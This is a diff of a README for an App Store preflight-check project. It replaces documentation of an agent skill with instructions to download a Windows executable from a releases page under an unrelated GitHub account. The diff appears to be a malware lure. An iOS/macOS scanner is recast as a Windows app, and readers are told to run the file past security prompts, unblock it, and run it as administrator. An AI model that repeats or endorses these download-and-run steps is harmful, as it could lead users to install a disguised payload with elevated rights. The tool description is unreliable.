@@ -1,113 +1,255 @@
-# ✈️ App Store Preflight
+# 🧰 app-store-preflight-skills - Check App Store Risks Before Submission
 
-An AI agent skill that runs pre-submission checks on your iOS/macOS project to catch common mistakes that lead to App Store rejection.
+[⬇️ Download the latest release](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
 
-## Overview
+## 🖥️ What this app does
 
-Preflight helps developers catch potential App Store Review guideline violations **before** submitting their app. It scans your Xcode project, source code, metadata, and configuration files to flag issues that commonly result in rejections from Apple.
+app-store-preflight-skills helps you scan iOS and macOS projects before you send them to the App Store. It looks for common rejection patterns and flags things that may cause review issues.
 
-This skill integrates with the [`asc` CLI](https://github.com/rudrankriyam/App-Store-Connect-CLI) (`brew install asc`) and the [ASC CLI Skills](https://github.com/rudrankriyam/app-store-connect-cli-skills) to pull and inspect App Store metadata.
+Use it to check for:
 
-Most metadata examples assume the canonical JSON layout written by
-`asc metadata pull`. If you are starting from fastlane metadata, adapt the path
-examples or pull the canonical `asc` layout first.
+- missing app permissions text
+- weak privacy wording
+- risky API use
+- build settings that may trigger review problems
+- common metadata issues
+- App Store rule patterns that often lead to rejection
 
-## Install
+## 📦 What you need
 
-```bash
-npx skills add truongduy2611/app-store-preflight-skills
-```
+Before you run the app on Windows, make sure you have:
 
-## Guideline Index (by App Type)
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free disk space for the app and your project files
+- the project folder you want to check
+- permission to read the files in that folder
 
-The `references/guidelines/` directory contains a **complete index of all 100+ Apple Review Guidelines** and **10 app-type specific checklists**:
+The app is built for simple local use. You open it, choose a project, and run a scan.
 
-| Checklist | App Type |
-|-----------|----------|
-| [all_apps.md](./references/guidelines/by-app-type/all_apps.md) | Universal (every submission) |
-| [subscription_iap.md](./references/guidelines/by-app-type/subscription_iap.md) | Subscriptions / In-App Purchases |
-| [social_ugc.md](./references/guidelines/by-app-type/social_ugc.md) | Social / User-Generated Content |
-| [kids.md](./references/guidelines/by-app-type/kids.md) | Kids Category |
-| [health_fitness.md](./references/guidelines/by-app-type/health_fitness.md) | Health, Fitness & Medical |
-| [games.md](./references/guidelines/by-app-type/games.md) | Games |
-| [macos.md](./references/guidelines/by-app-type/macos.md) | macOS / Mac App Store |
-| [ai_apps.md](./references/guidelines/by-app-type/ai_apps.md) | AI / Generative AI |
-| [crypto_finance.md](./references/guidelines/by-app-type/crypto_finance.md) | Crypto, Finance & Trading |
-| [vpn.md](./references/guidelines/by-app-type/vpn.md) | VPN & Networking |
+## ⬇️ Download the app
 
-📖 Full guideline reference: [references/guidelines/README.md](./references/guidelines/README.md)
+1. Open the release page:
+   [https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
+2. Find the latest release at the top of the page.
+3. In the release assets, download the Windows file.
+4. Save the file to your Downloads folder or another easy-to-find place.
 
-## How It Works
+## 🪟 Install on Windows
 
-1. **Identify app type** → load the matching checklist from `references/guidelines/by-app-type/`
-2. **Pull metadata** using `asc metadata pull --app "<APP_ID>" --version "<VERSION>" --dir ./metadata` (or the `asc-metadata-sync` skill)
-3. **Scan** against rejection rules in `references/rules/`
-4. **Report** findings with severity, affected files, and resolution steps
-5. **Autofix + Validate** — apply fixes, re-run affected checks
+1. Open the file you downloaded.
+2. If Windows shows a security prompt, choose the option to keep or run the file.
+3. Follow the setup steps on screen.
+4. If the app opens as a single file, move it to a folder you can use later.
+5. If Windows asks for permission, choose Yes.
 
-See [`SKILL.md`](./SKILL.md) for the full AI agent instructions.
+If you use a browser download bar, you can also right-click the file and choose Show in folder.
 
-## Rejection Rules
+## ▶️ Run the app
 
-All rules live in `references/rules/`, organized by category:
+1. Open the app from the Start menu or from the folder where you saved it.
+2. Wait for the main screen to load.
+3. Choose the iOS or macOS project folder you want to check.
+4. Start the scan.
+5. Review the results shown by the app.
 
-### Metadata (`references/rules/metadata/`)
+The app checks your project and lists items that need attention before submission.
 
-| Rule | Guideline | What It Catches |
-|------|-----------|----------------|
-| [competitor_terms](./references/rules/metadata/competitor_terms.md) | 2.3.1 | Android, Google Play, and other competitor brands |
-| [apple_trademark](./references/rules/metadata/apple_trademark.md) | 5.2.5 | Apple device images in icon, Apple trademark misuse |
-| [china_storefront](./references/rules/metadata/china_storefront.md) | 5 | OpenAI/ChatGPT/Gemini references (China) |
-| [accurate_metadata](./references/rules/metadata/accurate_metadata.md) | 2.3.4 | Device frames in app preview videos |
-| [subscription_metadata](./references/rules/metadata/subscription_metadata.md) | 3.1.2 | Missing ToS/EULA and Privacy Policy links |
+## 🔍 What the scan checks
 
-### Subscriptions (`references/rules/subscription/`)
+The scan looks for common issues that often lead to App Store review problems.
 
-| Rule | Guideline | What It Catches |
-|------|-----------|----------------|
-| [missing_tos_pp](./references/rules/subscription/missing_tos_pp.md) | 3.1.2 | No Terms or Privacy Policy in app/metadata |
-| [misleading_pricing](./references/rules/subscription/misleading_pricing.md) | 3.1.2 | Monthly price more prominent than billed amount |
+### Permission text
 
-### Privacy (`references/rules/privacy/`)
+The app checks for common missing permission messages, such as:
 
-| Rule | Guideline | What It Catches |
-|------|-----------|----------------|
-| [unnecessary_data](./references/rules/privacy/unnecessary_data.md) | 5.1.1 | Requiring irrelevant personal data |
-| [privacy_manifest](./references/rules/privacy/privacy_manifest.md) | 5.1.1 | Missing `PrivacyInfo.xcprivacy` |
+- camera use
+- microphone use
+- photo access
+- location access
+- contacts access
+- Bluetooth use
 
-### Design (`references/rules/design/`)
+If your app asks for access but does not explain why, App Store review may flag it.
 
-| Rule | Guideline | What It Catches |
-|------|-----------|----------------|
-| [sign_in_with_apple](./references/rules/design/sign_in_with_apple.md) | 4.0 | Asking name/email after SIWA |
-| [minimum_functionality](./references/rules/design/minimum_functionality.md) | 4.2 | WebView wrappers, apps with < 3 screens, no unique value |
+### Privacy wording
 
-### Entitlements (`references/rules/entitlements/`)
+The app checks for plain, clear privacy text in places such as:
 
-| Rule | Guideline | What It Catches |
-|------|-----------|----------------|
-| [unused_entitlements](./references/rules/entitlements/unused_entitlements.md) | 2.4.5(i) | Unused entitlements in Xcode project |
+- app descriptions
+- permission prompts
+- release notes
+- metadata fields
 
-## Adding New Rules
+### Risky code patterns
 
-Create a `.md` file in the appropriate `references/rules/` subdirectory:
+The app looks for patterns that often need a second look, such as:
 
-```markdown
-# Rule: [Short Title]
-- **Guideline**: [Apple Guideline Number]
-- **Severity**: REJECTION | WARNING
-- **Category**: metadata | subscription | privacy | design | entitlements
+- private or unsupported APIs
+- old framework use
+- unclear background activity
+- file access patterns that may not match Apple rules
 
-## What to Check
-## How to Detect
-## Resolution
-## Example Rejection
-```
+### Build and project settings
 
-## Related Skills
+The app reviews common settings that can affect review, such as:
 
-- [app-store-connect-cli-skills](https://github.com/rudrankriyam/app-store-connect-cli-skills) — ASC CLI skills for metadata sync, ASO audit, release flow
+- signing setup
+- bundle info
+- target settings
+- platform compatibility
 
-## License
+### Store listing content
 
-MIT
+The app can also help you catch problems in text you plan to send with the app, such as:
+
+- broken claim language
+- unclear feature notes
+- missing usage detail
+- inconsistent app names
+
+## 🧭 How to use it well
+
+1. Scan the project before you archive or submit it.
+2. Fix the items marked as high risk first.
+3. Scan again after each change.
+4. Keep your app copy clear and direct.
+5. Use the same app name, version, and bundle info across files.
+
+If you work on more than one app, scan each project on its own. That helps you keep results clear.
+
+## 📁 Best folder setup
+
+For the cleanest results, keep your project in a simple folder structure like this:
+
+- one folder per app
+- one main source folder
+- one build output folder
+- one folder for notes or review text
+
+Avoid putting the project inside deep nested folders with long names. Short paths make file checks easier.
+
+## 🧪 Good scan habits
+
+To get useful results:
+
+- run a scan after major changes
+- run a scan before each release
+- check permission text after adding new features
+- review any file marked as unusual
+- keep release notes short and plain
+
+If the app flags a file you do not expect, check that file against the rest of your project. A small mismatch can cause a review issue.
+
+## 🛠️ Common Windows setup fixes
+
+### The app does not open
+
+- Check that the download finished
+- Try opening the file again
+- Move the file to your Desktop and run it from there
+- Right-click the file and try Run as administrator if Windows blocks it
+
+### Windows blocks the file
+
+- Open the file’s properties
+- Look for an Unblock option
+- Apply the change and try again
+
+### The app opens but looks blank
+
+- Wait a few seconds for the first scan screen to load
+- Resize the window
+- Close and reopen the app
+
+### The app cannot read your project
+
+- Make sure the folder still exists
+- Check that you chose the correct folder
+- Move the project to a simpler path
+- Avoid folders with special access rules
+
+## 🧾 What the results mean
+
+The app uses simple labels to help you read the report.
+
+- **Low risk** means the item looks fine
+- **Review** means the item may need a second look
+- **High risk** means the item may lead to rejection
+- **Unknown** means the app could not confirm the item
+
+Treat the report as a checklist. Fix the high risk items first, then review the rest.
+
+## 🧩 Example workflow
+
+1. Open your app project.
+2. Run a preflight scan.
+3. Read the flagged items.
+4. Update the project files.
+5. Run the scan again.
+6. Repeat until the report is clean enough for submission.
+7. Prepare your App Store package and review text.
+8. Submit with more confidence
+
+## 📌 When to run a scan
+
+Run a scan when you:
+
+- add a new permission
+- change privacy text
+- add background work
+- update app metadata
+- change your build settings
+- prepare a release for App Store review
+- switch from test mode to production mode
+
+## 🔐 Privacy and local use
+
+This app is meant to scan your project files on your machine. Keep your source files in a place you trust and use standard Windows file access settings. If you store projects in shared folders, make sure you can read them without access errors.
+
+## 🧠 Tips for non-technical users
+
+If you are not used to project files, start with these steps:
+
+- use the folder that contains your app files
+- do not open random subfolders unless asked
+- keep one backup copy before you change anything
+- save text changes in small steps
+- scan again after each change
+
+If you are unsure which file to edit, search for the text shown in the report. That is often the fastest way to find the issue.
+
+## 🗂️ Release page
+
+Use the release page to get the Windows version:
+[https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
+
+## 📄 File types you may see
+
+Depending on the release, you may see one of these:
+
+- an `.exe` file
+- a zipped folder
+- a packaged desktop app
+- a single launch file
+
+If you download a zipped folder, right-click it and choose Extract All before opening the app.
+
+## 🧰 If you need to share results
+
+You can use the scan report to:
+
+- track fixes across a team
+- review issues before sending to a developer
+- compare results between builds
+- keep notes for your next submission
+
+When sharing the report, keep the project path and private file names out of view if they contain sensitive data.
+
+## 📍 Quick start
+
+1. Visit the release page.
+2. Download the latest Windows file.
+3. Open the file and follow the setup steps.
+4. Choose your app project folder.
+5. Run a scan and review the results
